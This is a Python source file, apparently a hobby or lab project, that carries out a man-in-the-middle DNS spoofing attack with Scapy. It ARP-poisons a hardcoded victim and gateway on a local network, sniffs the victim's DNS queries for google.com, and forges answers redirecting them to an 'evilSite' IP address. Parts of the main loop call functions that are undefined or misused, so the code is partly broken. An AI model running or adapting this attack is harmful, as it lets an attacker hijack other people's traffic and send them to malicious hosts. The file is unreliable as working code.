from scapy.all import *
import threading
import ArpPoison
from pyptables.rules import Reject
# TODO Fix For IPv6
# Integrate as MIM attack
# Fix crashing problem when DNSQR not detected

# def dns_req_test() : # This function is used to see if the packets we send out are correct
#     dns_packet2 = IP(dst='8.8.8.8') / UDP(dport=53) / DNS(rd=1, qd=DNSQR(qname='www.google.com'))
#     # dns_packet2.show()
#     send(dns_packet2)

ipVictim = '192.168.178.144' # The IP address of the victim
ipServer = '192.168.178.1' # The IP address of the gateway
goodSite = 'google.com' # The website we want to redirect them from
evilSite = '188.114.96.0' # The IP address we want to redirect the victim to
    
def dns_packet_filter(packet):
    if DNSQR in packet:
        if goodSite in packet[DNSQR].qname.decode():
            return True
    return False    
    
def sniffPKT(ipVictim, goodSite) :
    pkt = sniff(lfilter=dns_packet_filter, filter='udp and host ' + ipVictim, count=1, prn=lambda x: x.show())
    if goodSite in pkt[0][DNSQR].qname.decode():
        print("Correct DNS packet Intercepted")
        return pkt[0]
    else :
        return pkt[0]
    
def MIMspoofDNS(pkt, goodSite, evilSite) :
    EvilDNSResponse = IP() / UDP() / DNS()
    EvilDNSResponse[IP].dst = pkt[IP].src
    EvilDNSResponse[IP].src = pkt[IP].dst
    EvilDNSResponse[UDP].dport = pkt[UDP].sport
    EvilDNSResponse[UDP].sport = pkt[UDP].dport
    del EvilDNSResponse[UDP].chksum
    del EvilDNSResponse[IP].chksum
    EvilDNSResponse[DNS].rd = pkt[DNS].rd
    EvilDNSResponse[DNS].qd = pkt[DNS].qd
    EvilDNSResponse[DNS].qr = 1
    EvilDNSResponse[DNS].an = DNSRR(rrname = goodSite, rdata = evilSite)
    EvilDNSResponse[DNS].id = pkt[DNS].id
    EvilDNSResponse.show2(dump = True)
    EvilDNSResponse.show()
    print(EvilDNSResponse[IP].id)
    send(EvilDNSResponse)
    
# def testSniffnExtract() :
#     pkt = sniff(filter='host 8.8.8.8', session = IPSession, count=1, prn=lambda x: x.show())
#     pkt[0].show()
    
    
def main() :
    pktCounter = 0
    reject = Reject(proto='udp', dport='53')
    arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
    arpThread.start()
    while True: 
        try:
            scapy.layers.dns.DNS_am(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
            dns_spoof(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
            pktCounter = pktCounter + 1
            print('Intercepted packets: ' + str(pktCounter) )
        except KeyboardInterrupt:
            break

main()